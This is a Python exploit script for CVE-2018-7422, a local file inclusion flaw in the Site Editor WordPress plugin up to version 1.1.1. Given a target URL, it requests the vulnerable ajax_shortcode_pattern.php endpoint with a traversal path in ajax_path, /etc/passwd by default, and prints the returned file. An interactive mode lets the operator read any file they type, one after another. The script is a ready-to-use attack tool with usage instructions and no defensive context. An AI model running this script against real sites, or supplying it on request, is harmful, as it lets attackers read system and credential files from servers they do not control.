#!/usr/bin/env python3
# Title: Site Editor WordPress Plugin <= 1.1.1 Local File Inclusion
# Author: Jessi
# A Local File Inclusion vulnerability in the Site Editor plugin through 1.1.1 for WordPress allows remote attackers to retrieve arbitrary files via the ajax_path parameter to editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php.
# CVE-2018-7422
# Usage: python3 CVE-2018-7422.py -u http://site.com -f /etc/passwd (or -i)

import requests
import sys
import colorama
import argparse
from colorama import Fore, Style

# Colors
GREEN = Fore.GREEN
RED = Fore.RED
WHITE = Fore.WHITE
YELLOW = Fore.YELLOW
CYAN = Fore.CYAN
PINK = Fore.MAGENTA
BRIGHT = Style.BRIGHT
DIM = Style.DIM
NORM = Style.NORMAL
RST = Style.RESET_ALL


# Warn if no arguments
if len(sys.argv) <= 1:
    print(f'{RED}{BRIGHT}[X] {NORM}{WHITE}No arguments supplied.{RST}')
    print(f'{DIM} -h (--help) for full usage.{RST}')
    exit(1)


# Define parser and arguments
parser = argparse.ArgumentParser(description=f'{PINK}{BRIGHT} Site Editor WordPress Plugin <= 1.1.1{DIM} Local File Inclusion {BRIGHT}Exploit{RST}')

parser.add_argument('-u', '--url', help=f'Target URL{RED}{BRIGHT} REQUIRED{RST} {DIM}Example: http://site.com{RST}', default=None, required=True)
parser.add_argument('-f', '--file', help=f'File to read{YELLOW}{BRIGHT} OPTIONAL{RST} {DIM}Default: /etc/passwd{RST}', default='/etc/passwd', required=None)
parser.add_argument('-i', '--interactive', help=f'Interactive mode{YELLOW}{BRIGHT} OPTIONAL{RST}', action='store_true', default=False, required=None)

args = parser.parse_args()


# Set args to vars
url = args.url
file = args.file
interactive = args.interactive


# LFI
def lfi(url,file):
    if not interactive:
        lfi = url + '/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=' + file
        content = requests.get(lfi)
        print(content.text)
    else:
        file = input(f'{PINK}site-editor-lfi{RST} {RED}$>{RST} ')
        lfi = url + '/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=' + file
        content = requests.get(lfi)
        print(content.text)

# Execute
if __name__ == '__main__':
    while interactive:
        lfi(url,file)
    else:
        lfi(url,file)
